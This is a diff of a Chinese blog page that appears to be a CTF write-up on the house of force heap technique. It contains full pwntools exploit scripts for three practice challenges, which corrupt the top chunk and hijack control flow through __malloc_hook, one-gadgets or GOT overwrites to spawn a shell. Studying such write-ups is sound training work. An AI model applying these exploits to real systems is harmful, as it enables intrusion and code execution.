@@ -121,7 +121,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    1.9k 字
+                    2.1k 字
                   </span>&nbsp;
                 
 
@@ -129,7 +129,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      9 分钟
+                      10 分钟
                   </span>&nbsp;
                 
 
@@ -197,22 +197,24 @@ av-&gt;top        = remainder;
 <p><strong>这其中有个难缠的问题就是结构体对齐问题，目前我所练习到的题遇到这个问题的都是，减去一下<code>SIZE_SZ</code>（64位是8 ，32位是4）。</strong></p>
 <h3 id="让那个top-chunk-指针增大来修改位于高地址空间的内容"><a href="#让那个top-chunk-指针增大来修改位于高地址空间的内容" class="headerlink" title="让那个top chunk 指针增大来修改位于高地址空间的内容"></a>让那个top chunk 指针增大来修改位于高地址空间的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/s1Uuan.png" srcset="/img/loading.gif" alt><br>这个是较好理解的，常用修改libc上面某处的地址。</p>
 <h2 id="hitcon-training-bamboobox"><a href="#hitcon-training-bamboobox" class="headerlink" title="hitcon-training-bamboobox"></a>hitcon-training-bamboobox</h2><p>主要是修改一下，开始程序自动创建的存放2个函数指针的堆，其中hello-message用于程序开始时使用，goodbye-message 用于在程序结束时使用。</p>
-<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><ul>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
 <li>添加堆块，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。</li>
 <li>利用 house of force 技巧，分配 chunk 至堆的基地址。</li>
-<li>覆盖 goodbye-message 为magic 函数地址来控制程序执行流。<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
+<li>覆盖 goodbye-message 为magic 函数地址来控制程序执行流。</li>
+</ul>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
 import time
 local_file  = &#39;./bamboobox&#39;
 local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
 remote_libc = local_libc # &#39;../libc.so.6
 debug = 1
 if debug:
-  io = process(local_file)
-  context.log_level = &#39;debug&#39;
-  libc = ELF(local_libc)
+    io = process(local_file)
+    context.log_level = &#39;debug&#39;
+    libc = ELF(local_libc)
 else:
-  io = remote(&#39;node3.buuoj.cn&#39;,25784)
-  libc = ELF(remote_libc)
+    io = remote(&#39;node3.buuoj.cn&#39;,25784)
+    libc = ELF(remote_libc)
 elf = ELF(local_file)
 libc = elf.libc
 context.arch = elf.arch
@@ -229,63 +231,207 @@ uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
 info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))
 itr     = lambda                    :io.interactive()
 def dbg():
-  # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
-  gdb.attach(io)
-  pause()
-</code></pre></li>
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(size,content):
+    sla(&#39;choice&#39;,&#39;2&#39;)
+    sla(&#39;item name:&#39;,str(size))
+    sa(&#39;item&#39;,str(content))
+
+def free(id):
+    sla(&#39;choice&#39;,&#39;4&#39;)
+    sla(&#39;item&#39;,str(id))
+
+def show(id):
+    sla(&#39;choice&#39;,&#39;1&#39;)
+
+def edit(id,size,content):
+    sla(&#39;choice&#39;,&#39;3&#39;)
+    sla(&#39;item&#39;,str(id))
+    sla(&#39;item name&#39;,str(size))
+    sa(&#39;item&#39;,str(content))
+
+context.log_level = &#39;debug&#39;
+magic = 0x400d49
+add(0x30,&#39;chum&#39;)
+payload = &#39;a&#39; * 0x30 +p64(0) + p64(0xffffffffffffffff)
+edit(0,0x40,payload)
+size = -(0x40 + 0x20) - 0x10
+add(size,&#39; &#39;)
+payload = p64(0x400d49) + p64(0x400d49)
+add(0x10,payload)
+# sla(&#39;choice:&#39;,&#39;5&#39;)
+
+itr()
+
+</code></pre>
+<h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf-2020-force"></a>gyctf-2020-force</h2><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/uYKO6A.png" srcset="/img/loading.gif" alt><br>可以实现堆溢出。并且在你申请一个堆块以后，程序会给你打印出堆块的地址，这样就可以泄露出信息。</p>
+<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
+<li>申请一个很大堆，然后程序会mmap开启一个堆块，此时就可以泄漏出libc的地址。</li>
+<li>HOF</li>
+<li><code>__malloc_hook</code> + one gadget</li>
 </ul>
-<p>def add(size,content):<br>    sla(‘choice’,’2’)<br>    sla(‘item name:’,str(size))<br>    sa(‘item’,str(content))</p>
-<p>def free(id):<br>    sla(‘choice’,’4’)<br>    sla(‘item’,str(id))</p>
-<p>def show(id):<br>    sla(‘choice’,’1’)</p>
-<p>def edit(id,size,content):<br>    sla(‘choice’,’3’)<br>    sla(‘item’,str(id))<br>    sla(‘item name’,str(size))<br>    sa(‘item’,str(content))</p>
-<p>context.log_level = ‘debug’<br>magic = 0x400d49<br>add(0x30,’chum’)<br>payload = ‘a’ * 0x30 +p64(0) + p64(0xffffffffffffffff)<br>edit(0,0x40,payload)<br>size = -(0x40 + 0x20) - 0x10<br>add(size,’ ‘)<br>payload = p64(0x400d49) + p64(0x400d49)<br>add(0x10,payload)</p>
-<h1 id="sla-‘choice-’-’5’"><a href="#sla-‘choice-’-’5’" class="headerlink" title="sla(‘choice:’,’5’)"></a>sla(‘choice:’,’5’)</h1><p>itr()</p>
-<pre><code>
-## gyctf-2020-force
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+local_file  = &#39;./gyctf_2020_force&#39;
+remote_libc = local_libc # &#39;../libc.so.6
+debug = 0
+if debug:
+    io = process(local_file)
+    context.log_level = &#39;debug&#39;
+    libc = ELF(local_libc)
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,29457)
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+libc = elf.libc
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
+arae18 = 0x3ebca0
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+sea     = lambda delim,data         :io.sendafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def dbg():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
 
-### ida分析
+def add(size,date):
+    sla(&#39;2:puts&#39;,&#39;1&#39;)
+    sla(&#39;size&#39;,str(size))
+    ru(&#39;bin addr 0x&#39;)
+    heapaddr = int(r(12),16)
+    info_addr(&#39;heapaddr&#39;,heapaddr)
+    sa(&#39;content&#39;,str(date))
+    return heapaddr
+payload = 0x30 * &#39;a&#39; + p64(0) + p64(0xffffffffffffffff)
+libc_base = add(0x200000,&#39;111&#39;) + 0x200ff0
+info_addr(&#39;libc_base&#39;,libc_base)
+malloc_hook = libc_base + 0x3c4b10
+heapaddr = add(0x30,payload)
+size = malloc_hook-(heapaddr + 0x30) - 0x10 - 0x8 -0x8 -0x8
+print(&#39;size----&gt;&#39;+hex(size))
+add(size,&#39;a&#39;)
+rce = rce16[1] + libc_base
+payload = p64(0) + p64(rce) + p64(libc_base + libc.symbols[&#39;__libc_realloc&#39;] + realloc[1])
+add(0x20,payload)
+sla(&#39;2:puts&#39;,&#39;1&#39;)
+sla(&#39;size&#39;,&#39;30&#39;)
+# dbg()
+itr()</code></pre>
+<h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a><code>bcloud_bctf_2016</code></h2><p>这个题是一个十分精妙的题，漏洞出现在程序初始化。<br><img src="http://qiqianyun.chumen77.xyz/uPic/JMsnrt.png" srcset="/img/loading.gif" alt></p>
+<p>strcpy是以<code>\x00</code>来判断一个字符串是否结束的。<br>在栈中，当输入0x40个字符时，因为v2正好在s下面，这就让strcpy从s往v2上面复制时会<strong>把这个堆块的地址也给复制上去</strong>，当其返回name时，也就返回了堆块地址，然后就可以算出堆块的基地址。</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/5n1Rtx.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BGZjNT.png" srcset="/img/loading.gif" alt></p>
+<p>到了这个也是这个漏洞，填充完0x40个字符后，会把org堆块的指针和v3里面的内容给复制到org对应的堆块里，也就是0x40 + 4 + len(v3)字节的东西。org在堆块排布中也是最后一个，如果传过去<code>0xffffffff</code>,就可以改到top chunk的size位。</p>
+<h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
+<li>leak堆块base</li>
+<li>修改top chunk size</li>
+<li>hof到heaplist处</li>
+<li>给heaplist写上free got，用edit，修改其为puts</li>
+<li>泄漏libc地址</li>
+<li>修改free got 为system，然后指向<code>/bin/sh\x00</code></li>
+</ul>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+from LibcSearcher import *
+import time
+local_file  = &#39;./bcloud_bctf_2016&#39;
+local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+remote_libc = local_libc # &#39;../libc.so.6
+debug = 0
+if debug:
+    io = process(local_file)
+    context.log_level = &#39;debug&#39;
+    libc = ELF(local_libc)
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,27301)
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+libc = elf.libc
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
+arae18 = 0x3ebca0
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+sea     = lambda delim,data         :io.sendafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
 
-![][image-5]
-可以实现堆溢出。并且在你申请一个堆块以后，程序会给你打印出堆块的地址，这样就可以泄露出信息。
+def name(name):
+    sa(&#39;name&#39;,str(name))
+    ru(&#39;b&#39;)
+    heapbase = uu32(r(4)) - 0x8
+    info_addr(&#39;heapbase&#39;,heapbase)
+    return heapbase
+def org(org,host):
+    sa(&#39;Org:&#39;,str(org))
+    sla(&#39;Host:&#39;,str(host))
 
-### 利用思路
-- 申请一个很大堆，然后程序会mmap开启一个堆块，此时就可以泄漏出libc的地址。
-- HOF
-- `__malloc_hook` + one gadget
+def add(size,content):
+    sla(&#39;option---&gt;&gt;&#39;,&#39;1&#39;)
+    sla(&#39;length&#39;,str(size))
+    sa(&#39;content:&#39;,str(content))
 
-### exp
-</code></pre><p>from pwn import *<br>import time<br>local_libc  = ‘/lib/x86_64-linux-gnu/libc.so.6’<br>local_file  = ‘./gyctf_2020_force’<br>remote_libc = local_libc # ‘../libc.so.6<br>debug = 0<br>if debug:<br>    io = process(local_file)<br>    context.log_level = ‘debug’<br>    libc = ELF(local_libc)<br>else:<br>    io = remote(‘node3.buuoj.cn’,29457)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>libc = elf.libc<br>context.arch = elf.arch<br>context.terminal = [‘tmux’,’neww’]#,’’splitw’,’-h’<br>rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]<br>realloc = [0x2,0x4,0x6,0xB,0xC,0xD]<br>arae18 = 0x3ebca0<br>s      = lambda data               :io.send(data)<br>sa      = lambda delim,data         :io.sendafter(delim, data)<br>sl      = lambda data               :io.sendline(data)<br>sla     = lambda delim,data         :io.sendlineafter(delim, data)<br>sea     = lambda delim,data         :io.sendafter(delim, data)<br>r      = lambda numb=4096          :io.recv(numb)<br>ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)<br>uu32    = lambda data               :u32(data.ljust(4, ‘\0’))<br>uu64    = lambda data               :u64(data.ljust(8, ‘\0’))<br>info_addr = lambda tag, addr        :io.info(tag + ‘==&gt;’ +’: {:#x}’.format(addr))<br>itr     = lambda                    :io.interactive()<br>def dbg():<br>    # gdb.attach(proc.pidof(io)[0],gdbscript=’b main’)<br>    gdb.attach(io)<br>    pause()</p>
-<p>def add(size,date):<br>    sla(‘2:puts’,’1’)<br>    sla(‘size’,str(size))<br>    ru(‘bin addr 0x’)<br>    heapaddr = int(r(12),16)<br>    info_addr(‘heapaddr’,heapaddr)<br>    sa(‘content’,str(date))<br>    return heapaddr<br>payload = 0x30 * ‘a’ + p64(0) + p64(0xffffffffffffffff)<br>libc_base = add(0x200000,’111’) + 0x200ff0<br>info_addr(‘libc_base’,libc_base)<br>malloc_hook = libc_base + 0x3c4b10<br>heapaddr = add(0x30,payload)<br>size = malloc_hook-(heapaddr + 0x30) - 0x10 - 0x8 -0x8 -0x8<br>print(‘size—-&gt;’+hex(size))<br>add(size,’a’)<br>rce = rce16[1] + libc_base<br>payload = p64(0) + p64(rce) + p64(libc_base + libc.symbols[‘__libc_realloc’] + realloc[1])<br>add(0x20,payload)<br>sla(‘2:puts’,’1’)<br>sla(‘size’,’30’)</p>
-<h1 id="dbg"><a href="#dbg" class="headerlink" title="dbg()"></a>dbg()</h1><p>itr()</p>
-<pre><code>
-## `bcloud_bctf_2016`
+def edit(id,content):
+    sla(&#39;---&gt;&gt;&#39;,&#39;3&#39;)
+    sla(&#39;id&#39;,str(id))
+    sa(&#39;the new content&#39;,str(content))
 
-这个题是一个十分精妙的题，漏洞出现在程序初始化。
-![][image-6]
-strcpy是以`\x00`来判断一个字符串是否结束的。
-在栈中，当输入0x40个字符时，因为v2正好在s下面，这就让strcpy从s往v2上面复制时会**把这个堆块的地址也给复制上去**，当其返回name时，也就返回了堆块地址，然后就可以算出堆块的基地址。
+def free(id):
+    sla(&#39;-&gt;&#39;,&#39;4&#39;)
+    sla(&#39;id&#39;,str(id))
 
-![][image-7]
-![][image-8]
+context.log_level = &#39;debug&#39;
 
-到了这个也是这个漏洞，填充完0x40个字符后，会把org堆块的指针和v3里面的内容给复制到org对应的堆块里，也就是0x40 + 4 + len(v3)字节的东西。org在堆块排布中也是最后一个，如果传过去`0xffffffff`,就可以改到top chunk的size位。
-
-### 利用思路
-- leak堆块base
-- 修改top chunk size
-- hof到heaplist处
-- 给heaplist写上free got，用edit，修改其为puts
-- 泄漏libc地址
-- 修改free got 为system，然后指向`/bin/sh\x00`
-
-### exp
-</code></pre><p>from pwn import *<br>from LibcSearcher import *<br>import time<br>local_file  = ‘./bcloud_bctf_2016’<br>local_libc  = ‘/lib/x86_64-linux-gnu/libc.so.6’<br>remote_libc = local_libc # ‘../libc.so.6<br>debug = 0<br>if debug:<br>    io = process(local_file)<br>    context.log_level = ‘debug’<br>    libc = ELF(local_libc)<br>else:<br>    io = remote(‘node3.buuoj.cn’,27301)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>libc = elf.libc<br>context.arch = elf.arch<br>context.terminal = [‘tmux’,’neww’]#,’’splitw’,’-h’<br>rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]<br>realloc = [0x2,0x4,0x6,0xB,0xC,0xD]<br>arae18 = 0x3ebca0<br>s      = lambda data               :io.send(data)<br>sa      = lambda delim,data         :io.sendafter(delim, data)<br>sl      = lambda data               :io.sendline(data)<br>sla     = lambda delim,data         :io.sendlineafter(delim, data)<br>sea     = lambda delim,data         :io.sendafter(delim, data)<br>r      = lambda numb=4096          :io.recv(numb)<br>ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)<br>uu32    = lambda data               :u32(data.ljust(4, ‘\0’))<br>uu64    = lambda data               :u64(data.ljust(8, ‘\0’))<br>info_addr = lambda tag, addr        :io.info(tag + ‘==&gt;’ +’: {:#x}’.format(addr))<br>itr     = lambda                    :io.interactive()<br>def debug():<br>    # gdb.attach(proc.pidof(io)[0],gdbscript=’b main’)<br>    gdb.attach(io)<br>    pause()</p>
-<p>def name(name):<br>    sa(‘name’,str(name))<br>    ru(‘b’)<br>    heapbase = uu32(r(4)) - 0x8<br>    info_addr(‘heapbase’,heapbase)<br>    return heapbase<br>def org(org,host):<br>    sa(‘Org:’,str(org))<br>    sla(‘Host:’,str(host))</p>
-<p>def add(size,content):<br>    sla(‘option—&gt;&gt;’,’1’)<br>    sla(‘length’,str(size))<br>    sa(‘content:’,str(content))</p>
-<p>def edit(id,content):<br>    sla(‘—&gt;&gt;’,’3’)<br>    sla(‘id’,str(id))<br>    sa(‘the new content’,str(content))</p>
-<p>def free(id):<br>    sla(‘-&gt;’,’4’)<br>    sla(‘id’,str(id))</p>
-<p>context.log_level = ‘debug’</p>
-<p>sizelist = 0x804B0A0<br>heaplist = 0x804B120<br>heapbase = name(‘a’ * (0x40-1) + ‘b’)<br>top = heapbase + 0xd8<br>info_addr(‘top’,top)<br>org(‘b’*0x40,p32(0xffffffff)) #chang top chunk size<br>size = heaplist - top - 0x10<br>add(size,’\n’)<br>add(0x18,’\n’)<br>payload = p32(0) + p32(elf.got[‘free’]) + p32(elf.got[‘atoi’])  +p32(0x804B128+4+4) + ‘/bin/sh\x00’<br>edit(1,payload + ‘\n’)<br>puts_plt = elf.plt[‘puts’]<br>edit(1,p32(puts_plt) + ‘\n’)<br>free(2)<br>io.recv(1)<br>io.recv(1)<br>atoi = uu32(r(4))<br>info_addr(‘atoi’,atoi)<br>libc = LibcSearcher(‘atoi’,atoi)<br>libc_base = atoi - libc.dump(‘atoi’)<br>system = libc_base + libc.dump(‘system’)<br>info_addr(‘libc_base’,libc_base)<br>edit(1,p32(system) + ‘\n’)<br>free(3)<br>itr()<br>```</p>
+sizelist = 0x804B0A0
+heaplist = 0x804B120
+heapbase = name(&#39;a&#39; * (0x40-1) + &#39;b&#39;)
+top = heapbase + 0xd8
+info_addr(&#39;top&#39;,top)
+org(&#39;b&#39;*0x40,p32(0xffffffff)) #chang top chunk size
+size = heaplist - top - 0x10
+add(size,&#39;\n&#39;)
+add(0x18,&#39;\n&#39;)
+payload = p32(0) + p32(elf.got[&#39;free&#39;]) + p32(elf.got[&#39;atoi&#39;])  +p32(0x804B128+4+4) + &#39;/bin/sh\x00&#39;
+edit(1,payload + &#39;\n&#39;)
+puts_plt = elf.plt[&#39;puts&#39;]
+edit(1,p32(puts_plt) + &#39;\n&#39;)
+free(2)
+io.recv(1)
+io.recv(1)
+atoi = uu32(r(4))
+info_addr(&#39;atoi&#39;,atoi)
+libc = LibcSearcher(&#39;atoi&#39;,atoi)
+libc_base = atoi - libc.dump(&#39;atoi&#39;)
+system = libc_base + libc.dump(&#39;system&#39;)
+info_addr(&#39;libc_base&#39;,libc_base)
+edit(1,p32(system) + &#39;\n&#39;)
+free(3)
+itr()</code></pre>
 
             <hr>
           </div>
